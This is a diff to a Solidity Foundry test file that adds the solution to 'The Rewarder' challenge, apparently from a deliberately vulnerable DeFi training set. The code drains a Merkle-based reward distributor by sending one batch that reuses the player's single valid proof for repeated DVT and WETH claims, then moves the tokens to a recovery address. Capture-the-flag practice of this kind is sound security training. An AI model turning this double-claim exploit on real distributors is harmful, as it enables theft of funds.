@@ -148,7 +148,83 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        (uint256 dvtIndex, uint256 dvtAmount, uint256 wethIndex, uint256 wethAmount) = _getPlayerRewardInfo();
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // Use floor division: we cannot claim more than pool has (would underflow in distributor)
+        uint256 nDvtClaims = distributor.getRemaining(address(dvt)) / dvtAmount;
+        uint256 nWethClaims = distributor.getRemaining(address(weth)) / wethAmount;
+
+        (IERC20[] memory tokensToClaim, Claim[] memory claims) =
+            _buildExploitInputs(dvtLeaves, wethLeaves, dvtIndex, dvtAmount, wethIndex, wethAmount, nDvtClaims, nWethClaims);
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }
+
+    function _buildExploitInputs(
+        bytes32[] memory dvtLeaves,
+        bytes32[] memory wethLeaves,
+        uint256 dvtIndex,
+        uint256 dvtAmount,
+        uint256 wethIndex,
+        uint256 wethAmount,
+        uint256 nDvtClaims,
+        uint256 nWethClaims
+    ) internal view returns (IERC20[] memory tokensToClaim, Claim[] memory claims) {
+        uint256 totalClaims = nDvtClaims + nWethClaims;
+        tokensToClaim = new IERC20[](totalClaims);
+        claims = new Claim[](totalClaims);
+
+        for (uint256 i = 0; i < nDvtClaims; i++) {
+            tokensToClaim[i] = IERC20(address(dvt));
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: dvtAmount,
+                tokenIndex: i,
+                proof: merkle.getProof(dvtLeaves, dvtIndex)
+            });
+        }
+        for (uint256 i = 0; i < nWethClaims; i++) {
+            tokensToClaim[nDvtClaims + i] = IERC20(address(weth));
+            claims[nDvtClaims + i] = Claim({
+                batchNumber: 0,
+                amount: wethAmount,
+                tokenIndex: nDvtClaims + i,
+                proof: merkle.getProof(wethLeaves, wethIndex)
+            });
+        }
+    }
+
+    function _getPlayerRewardInfo()
+        internal
+        view
+        returns (uint256 dvtIndex, uint256 dvtAmount, uint256 wethIndex, uint256 wethAmount)
+    {
+        string memory root = vm.projectRoot();
+        Reward[] memory dvtRewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(root, "/test/the-rewarder/dvt-distribution.json"))), (Reward[]));
+        Reward[] memory wethRewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(root, "/test/the-rewarder/weth-distribution.json"))), (Reward[]));
+
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (dvtRewards[i].beneficiary == player) {
+                dvtIndex = i;
+                dvtAmount = dvtRewards[i].amount;
+                break;
+            }
+        }
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (wethRewards[i].beneficiary == player) {
+                wethIndex = i;
+                wethAmount = wethRewards[i].amount;
+                break;
+            }
+        }
     }
 
     /**
